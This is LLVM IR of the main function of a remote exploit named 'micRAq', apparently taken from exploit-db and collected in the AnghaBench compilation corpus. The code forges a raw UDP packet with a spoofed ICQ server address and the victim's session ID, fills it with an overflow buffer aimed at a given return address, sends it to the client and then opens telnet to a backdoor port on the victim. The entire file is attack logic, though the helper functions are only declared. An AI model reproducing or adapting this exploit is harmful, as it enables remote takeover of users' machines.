; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20569.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20569.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_5__, i32 }
%struct.TYPE_5__ = type { i8* }
%struct.ip = type { i32, i32, i32, i32, %struct.TYPE_7__, %struct.TYPE_6__, i32, i8*, i64, i64, i8* }
%struct.TYPE_7__ = type { i8* }
%struct.TYPE_6__ = type { i8* }
%struct.udphdr = type { i64, i8*, i8*, i8* }
%struct.srv_net_icq_pak = type { i32, %struct.TYPE_8__ }
%struct.TYPE_8__ = type { i32*, i32*, i64*, i64*, i64*, i64*, i32*, i64 }
%struct.sockaddr = type { i32 }

@DEFAULT_BUFFER_ADDRESS = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [101 x i8] c"\0A\09[ [ micRAq ] - by tHE rECIdjVO <recidjvo@pkcrew.org> ]\0A\09\09Packet Knights - http://www.pkcrew.org/\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [73 x i8] c"usage: %s <client_ip> <client_port> <server_ip> <hex_session> [buffer]\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [55 x i8] c"Error: <session> must be 8 digits exadecimal number.\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [29 x i8] c"Using buffer address: 0x%x\0A\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [13 x i8] c"setsockopt()\00", align 1
@IPPROTO_UDP = common dso_local global i32 0, align 4
@ICQ_SERVER_PORT = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [9 x i8] c"sendto()\00", align 1
@.str.7 = private unnamed_addr constant [22 x i8] c"Unable to connect :\\\0A\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"\09\22To be\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [17 x i8] c", or not to be.\0A\00", align 1
@.str.10 = private unnamed_addr constant [26 x i8] c"\09 This is the question.\22\0A\00", align 1
@.str.11 = private unnamed_addr constant [27 x i8] c"\09\09\09(William Shakespeare)\0A\0A\00", align 1
@.str.12 = private unnamed_addr constant [16 x i8] c"/usr/bin/telnet\00", align 1
@.str.13 = private unnamed_addr constant [7 x i8] c"telnet\00", align 1
@BACK_PORT = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca %struct.sockaddr_in, align 8
  %11 = alloca %struct.ip*, align 8
  %12 = alloca %struct.udphdr*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca [3 x i8], align 1
  %15 = alloca %struct.srv_net_icq_pak*, align 8
  %16 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 1, i32* %8, align 4
  %17 = load i64, i64* @DEFAULT_BUFFER_ADDRESS, align 8
  store i64 %17, i64* %9, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str, i64 0, i64 0))
  %19 = load i32, i32* %4, align 4
  %20 = icmp ne i32 %19, 5
  br i1 %20, label %21, label %30

21:                                               ; preds = %2
  %22 = load i32, i32* %4, align 4
  %23 = icmp ne i32 %22, 6
  br i1 %23, label %24, label %30

24:                                               ; preds = %21
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.1, i64 0, i64 0), i8* %27)
  %29 = call i32 @exit(i32 -1) #3
  unreachable

30:                                               ; preds = %21, %2
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 4
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strlen(i8* %33)
  %35 = icmp ne i32 %34, 8
  br i1 %35, label %36, label %39

36:                                               ; preds = %30
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.2, i64 0, i64 0))
  %38 = call i32 @exit(i32 -1) #3
  unreachable

39:                                               ; preds = %30
  %40 = load i32, i32* %4, align 4
  %41 = icmp eq i32 %40, 6
  br i1 %41, label %42, label %47

42:                                               ; preds = %39
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 5
  %45 = load i8*, i8** %44, align 8
  %46 = call i64 @strtoul(i8* %45, i32* null, i32 16)
  store i64 %46, i64* %9, align 8
  br label %47

47:                                               ; preds = %42, %39
  %48 = load i64, i64* %9, align 8
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0), i64 %48)
  %50 = load i32, i32* @AF_INET, align 4
  %51 = load i32, i32* @SOCK_RAW, align 4
  %52 = load i32, i32* @IPPROTO_RAW, align 4
  %53 = call i32 @socket(i32 %50, i32 %51, i32 %52)
  store i32 %53, i32* %6, align 4
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %58

55:                                               ; preds = %47
  %56 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %57 = call i32 @exit(i32 -1) #3
  unreachable

58:                                               ; preds = %47
  %59 = load i32, i32* %6, align 4
  %60 = load i32, i32* @IPPROTO_IP, align 4
  %61 = load i32, i32* @IP_HDRINCL, align 4
  %62 = call i64 @setsockopt(i32 %59, i32 %60, i32 %61, i32* %8, i32 4)
  %63 = icmp slt i64 %62, 0
  br i1 %63, label %64, label %69

64:                                               ; preds = %58
  %65 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0))
  %66 = load i32, i32* %6, align 4
  %67 = call i32 @close(i32 %66)
  %68 = call i32 @exit(i32 -1) #3
  unreachable

69:                                               ; preds = %58
  %70 = call i8* @malloc(i32 1128)
  store i8* %70, i8** %13, align 8
  %71 = load i8*, i8** %13, align 8
  %72 = bitcast i8* %71 to %struct.ip*
  store %struct.ip* %72, %struct.ip** %11, align 8
  %73 = load i8*, i8** %13, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 72
  %75 = bitcast i8* %74 to %struct.udphdr*
  store %struct.udphdr* %75, %struct.udphdr** %12, align 8
  %76 = load i8*, i8** %13, align 8
  %77 = getelementptr inbounds i8, i8* %76, i64 72
  %78 = getelementptr inbounds i8, i8* %77, i64 32
  %79 = bitcast i8* %78 to %struct.srv_net_icq_pak*
  store %struct.srv_net_icq_pak* %79, %struct.srv_net_icq_pak** %15, align 8
  %80 = load i8*, i8** %13, align 8
  %81 = call i32 @memset(i8* %80, i32 0, i32 1128)
  %82 = load i32, i32* @AF_INET, align 4
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %82, i32* %83, align 8
  %84 = load i8**, i8*** %5, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = call i8* @inet_addr(i8* %86)
  %88 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %89 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %88, i32 0, i32 0
  store i8* %87, i8** %89, align 8
  %90 = call i8* @htons(i32 1128)
  %91 = load %struct.ip*, %struct.ip** %11, align 8
  %92 = getelementptr inbounds %struct.ip, %struct.ip* %91, i32 0, i32 10
  store i8* %90, i8** %92, align 8
  %93 = load %struct.ip*, %struct.ip** %11, align 8
  %94 = getelementptr inbounds %struct.ip, %struct.ip* %93, i32 0, i32 0
  store i32 5, i32* %94, align 8
  %95 = load %struct.ip*, %struct.ip** %11, align 8
  %96 = getelementptr inbounds %struct.ip, %struct.ip* %95, i32 0, i32 1
  store i32 4, i32* %96, align 4
  %97 = load %struct.ip*, %struct.ip** %11, align 8
  %98 = getelementptr inbounds %struct.ip, %struct.ip* %97, i32 0, i32 2
  store i32 255, i32* %98, align 8
  %99 = load %struct.ip*, %struct.ip** %11, align 8
  %100 = getelementptr inbounds %struct.ip, %struct.ip* %99, i32 0, i32 9
  store i64 0, i64* %100, align 8
  %101 = load %struct.ip*, %struct.ip** %11, align 8
  %102 = getelementptr inbounds %struct.ip, %struct.ip* %101, i32 0, i32 8
  store i64 0, i64* %102, align 8
  %103 = call i32 (...) @getpid()
  %104 = call i8* @htons(i32 %103)
  %105 = load %struct.ip*, %struct.ip** %11, align 8
  %106 = getelementptr inbounds %struct.ip, %struct.ip* %105, i32 0, i32 7
  store i8* %104, i8** %106, align 8
  %107 = load i32, i32* @IPPROTO_UDP, align 4
  %108 = load %struct.ip*, %struct.ip** %11, align 8
  %109 = getelementptr inbounds %struct.ip, %struct.ip* %108, i32 0, i32 6
  store i32 %107, i32* %109, align 8
  %110 = load i8**, i8*** %5, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 3
  %112 = load i8*, i8** %111, align 8
  %113 = call i8* @inet_addr(i8* %112)
  %114 = load %struct.ip*, %struct.ip** %11, align 8
  %115 = getelementptr inbounds %struct.ip, %struct.ip* %114, i32 0, i32 5
  %116 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %115, i32 0, i32 0
  store i8* %113, i8** %116, align 8
  %117 = load i8**, i8*** %5, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 1
  %119 = load i8*, i8** %118, align 8
  %120 = call i8* @inet_addr(i8* %119)
  %121 = load %struct.ip*, %struct.ip** %11, align 8
  %122 = getelementptr inbounds %struct.ip, %struct.ip* %121, i32 0, i32 4
  %123 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %122, i32 0, i32 0
  store i8* %120, i8** %123, align 8
  %124 = load %struct.ip*, %struct.ip** %11, align 8
  %125 = bitcast %struct.ip* %124 to i32*
  %126 = call i32 @in_cksum(i32* %125, i32 72)
  %127 = load %struct.ip*, %struct.ip** %11, align 8
  %128 = getelementptr inbounds %struct.ip, %struct.ip* %127, i32 0, i32 3
  store i32 %126, i32* %128, align 4
  %129 = load i32, i32* @ICQ_SERVER_PORT, align 4
  %130 = call i8* @htons(i32 %129)
  %131 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %132 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %131, i32 0, i32 3
  store i8* %130, i8** %132, align 8
  %133 = load i8**, i8*** %5, align 8
  %134 = getelementptr inbounds i8*, i8** %133, i64 2
  %135 = load i8*, i8** %134, align 8
  %136 = call i32 @atoi(i8* %135)
  %137 = call i8* @htons(i32 %136)
  %138 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %139 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %138, i32 0, i32 2
  store i8* %137, i8** %139, align 8
  %140 = call i8* @htons(i32 1056)
  %141 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %142 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %141, i32 0, i32 1
  store i8* %140, i8** %142, align 8
  %143 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %144 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %143, i32 0, i32 0
  store i64 0, i64* %144, align 8
  %145 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %146 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %145, i32 0, i32 1
  %147 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %146, i32 0, i32 0
  %148 = load i32*, i32** %147, align 8
  %149 = getelementptr inbounds i32, i32* %148, i64 0
  store i32 5, i32* %149, align 4
  %150 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %151 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %150, i32 0, i32 1
  %152 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %151, i32 0, i32 0
  %153 = load i32*, i32** %152, align 8
  %154 = getelementptr inbounds i32, i32* %153, i64 1
  store i32 0, i32* %154, align 4
  %155 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %156 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %155, i32 0, i32 1
  %157 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %156, i32 0, i32 7
  store i64 0, i64* %157, align 8
  store i32 0, i32* %7, align 4
  br label %158

158:                                              ; preds = %190, %69
  %159 = load i32, i32* %7, align 4
  %160 = icmp slt i32 %159, 8
  br i1 %160, label %161, label %193

161:                                              ; preds = %158
  %162 = load i8**, i8*** %5, align 8
  %163 = getelementptr inbounds i8*, i8** %162, i64 4
  %164 = load i8*, i8** %163, align 8
  %165 = load i32, i32* %7, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds i8, i8* %164, i64 %166
  %168 = load i8, i8* %167, align 1
  %169 = getelementptr inbounds [3 x i8], [3 x i8]* %14, i64 0, i64 0
  store i8 %168, i8* %169, align 1
  %170 = load i8**, i8*** %5, align 8
  %171 = getelementptr inbounds i8*, i8** %170, i64 4
  %172 = load i8*, i8** %171, align 8
  %173 = load i32, i32* %7, align 4
  %174 = add nsw i32 %173, 1
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds i8, i8* %172, i64 %175
  %177 = load i8, i8* %176, align 1
  %178 = getelementptr inbounds [3 x i8], [3 x i8]* %14, i64 0, i64 1
  store i8 %177, i8* %178, align 1
  %179 = getelementptr inbounds [3 x i8], [3 x i8]* %14, i64 0, i64 2
  store i8 0, i8* %179, align 1
  %180 = getelementptr inbounds [3 x i8], [3 x i8]* %14, i64 0, i64 0
  %181 = call i32 @strtol(i8* %180, i32* null, i32 16)
  %182 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %183 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %182, i32 0, i32 1
  %184 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %183, i32 0, i32 6
  %185 = load i32*, i32** %184, align 8
  %186 = load i32, i32* %7, align 4
  %187 = sdiv i32 %186, 2
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i32, i32* %185, i64 %188
  store i32 %181, i32* %189, align 4
  br label %190

190:                                              ; preds = %161
  %191 = load i32, i32* %7, align 4
  %192 = add nsw i32 %191, 2
  store i32 %192, i32* %7, align 4
  br label %158

193:                                              ; preds = %158
  %194 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %195 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %194, i32 0, i32 1
  %196 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %195, i32 0, i32 1
  %197 = load i32*, i32** %196, align 8
  %198 = getelementptr inbounds i32, i32* %197, i64 0
  store i32 4, i32* %198, align 4
  %199 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %200 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %199, i32 0, i32 1
  %201 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %200, i32 0, i32 1
  %202 = load i32*, i32** %201, align 8
  %203 = getelementptr inbounds i32, i32* %202, i64 1
  store i32 1, i32* %203, align 4
  %204 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %205 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %204, i32 0, i32 1
  %206 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %205, i32 0, i32 5
  %207 = load i64*, i64** %206, align 8
  %208 = getelementptr inbounds i64, i64* %207, i64 0
  store i64 0, i64* %208, align 8
  %209 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %210 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %209, i32 0, i32 1
  %211 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %210, i32 0, i32 5
  %212 = load i64*, i64** %211, align 8
  %213 = getelementptr inbounds i64, i64* %212, i64 1
  store i64 0, i64* %213, align 8
  %214 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %215 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %214, i32 0, i32 1
  %216 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %215, i32 0, i32 4
  %217 = load i64*, i64** %216, align 8
  %218 = getelementptr inbounds i64, i64* %217, i64 0
  store i64 0, i64* %218, align 8
  %219 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %220 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %219, i32 0, i32 1
  %221 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %220, i32 0, i32 4
  %222 = load i64*, i64** %221, align 8
  %223 = getelementptr inbounds i64, i64* %222, i64 1
  store i64 0, i64* %223, align 8
  %224 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %225 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %224, i32 0, i32 1
  %226 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %225, i32 0, i32 3
  %227 = load i64*, i64** %226, align 8
  %228 = getelementptr inbounds i64, i64* %227, i64 0
  store i64 0, i64* %228, align 8
  %229 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %230 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %229, i32 0, i32 1
  %231 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %230, i32 0, i32 3
  %232 = load i64*, i64** %231, align 8
  %233 = getelementptr inbounds i64, i64* %232, i64 1
  store i64 0, i64* %233, align 8
  %234 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %235 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %234, i32 0, i32 1
  %236 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %235, i32 0, i32 3
  %237 = load i64*, i64** %236, align 8
  %238 = getelementptr inbounds i64, i64* %237, i64 2
  store i64 0, i64* %238, align 8
  %239 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %240 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %239, i32 0, i32 1
  %241 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %240, i32 0, i32 3
  %242 = load i64*, i64** %241, align 8
  %243 = getelementptr inbounds i64, i64* %242, i64 3
  store i64 0, i64* %243, align 8
  %244 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %245 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %244, i32 0, i32 1
  %246 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %245, i32 0, i32 2
  %247 = load i64*, i64** %246, align 8
  %248 = getelementptr inbounds i64, i64* %247, i64 0
  store i64 0, i64* %248, align 8
  %249 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %250 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %249, i32 0, i32 1
  %251 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %250, i32 0, i32 2
  %252 = load i64*, i64** %251, align 8
  %253 = getelementptr inbounds i64, i64* %252, i64 1
  store i64 0, i64* %253, align 8
  %254 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %255 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %254, i32 0, i32 1
  %256 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %255, i32 0, i32 2
  %257 = load i64*, i64** %256, align 8
  %258 = getelementptr inbounds i64, i64* %257, i64 2
  store i64 0, i64* %258, align 8
  %259 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %260 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %259, i32 0, i32 1
  %261 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %260, i32 0, i32 2
  %262 = load i64*, i64** %261, align 8
  %263 = getelementptr inbounds i64, i64* %262, i64 3
  store i64 0, i64* %263, align 8
  %264 = load %struct.srv_net_icq_pak*, %struct.srv_net_icq_pak** %15, align 8
  %265 = getelementptr inbounds %struct.srv_net_icq_pak, %struct.srv_net_icq_pak* %264, i32 0, i32 0
  %266 = load i32, i32* %265, align 8
  %267 = call i32 @build_buffer(i32 %266, i64* %9)
  %268 = load i32, i32* %6, align 4
  %269 = load i8*, i8** %13, align 8
  %270 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %271 = call i64 @sendto(i32 %268, i8* %269, i32 1128, i32 0, %struct.sockaddr* %270, i32 16)
  %272 = icmp slt i64 %271, 0
  br i1 %272, label %273, label %278

273:                                              ; preds = %193
  %274 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  %275 = load i32, i32* %6, align 4
  %276 = call i32 @close(i32 %275)
  %277 = call i32 @exit(i32 -1) #3
  unreachable

278:                                              ; preds = %193
  %279 = load i32, i32* %6, align 4
  %280 = call i32 @close(i32 %279)
  %281 = call i32 @sleep(i32 1)
  %282 = load i8**, i8*** %5, align 8
  %283 = getelementptr inbounds i8*, i8** %282, i64 1
  %284 = load i8*, i8** %283, align 8
  %285 = call i64 @go(i8* %284)
  %286 = icmp slt i64 %285, 0
  br i1 %286, label %287, label %290

287:                                              ; preds = %278
  %288 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i64 0, i64 0))
  %289 = call i32 @exit(i32 -1) #3
  unreachable

290:                                              ; preds = %278
  %291 = call i32 @sleep(i32 1)
  %292 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  %293 = load i32, i32* @stdout, align 4
  %294 = call i32 @fflush(i32 %293)
  %295 = call i32 @sleep(i32 2)
  %296 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i64 0, i64 0))
  %297 = call i32 @sleep(i32 1)
  %298 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.10, i64 0, i64 0))
  %299 = call i32 @sleep(i32 1)
  %300 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.11, i64 0, i64 0))
  %301 = load i8**, i8*** %5, align 8
  %302 = getelementptr inbounds i8*, i8** %301, i64 1
  %303 = load i8*, i8** %302, align 8
  %304 = load i32, i32* @BACK_PORT, align 4
  %305 = call i32 @execl(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.13, i64 0, i64 0), i8* %303, i32 %304, i32* null)
  %306 = call i32 @exit(i32 -1) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @strtoul(i8*, i32*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i8* @inet_addr(i8*) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @in_cksum(i32*, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @strtol(i8*, i32*, i32) #1

declare dso_local i32 @build_buffer(i32, i64*) #1

declare dso_local i64 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i64 @go(i8*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
